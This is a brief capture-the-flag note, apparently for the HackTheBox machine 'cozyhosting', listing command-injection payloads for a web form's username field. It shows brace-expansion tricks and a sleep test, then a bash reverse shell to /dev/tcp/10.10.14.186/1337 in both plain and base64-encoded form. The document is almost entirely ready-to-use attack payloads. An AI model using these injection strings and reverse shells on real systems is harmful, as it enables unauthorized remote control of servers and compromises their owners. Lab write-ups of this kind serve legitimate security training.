
---

#### PoC

```
host=cozyhosting.htb&username={kanderson,-p,2000}
```

Sometimes u need to put the ; symbol in front and behind those, for command injection to work asw.

```
host=10.10.14.186&username=;{sleep,10};
```

#### RevShell Payload


```
host=10.10.14.186&username=;{bash,-c,'bash,-i,>&,/dev/tcp/10.10.14.186/1337,0>&1'};
```


#### RevShell with Brace Expansion Technique and encoded in base64

```
host=10.10.14.186&username=;{echo,-n,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTg2LzEzMzcgICAwPiYxKysK}|{base64 -d}|bash;
```

Note: It's important to remove all "+" and "=" in a base64 string.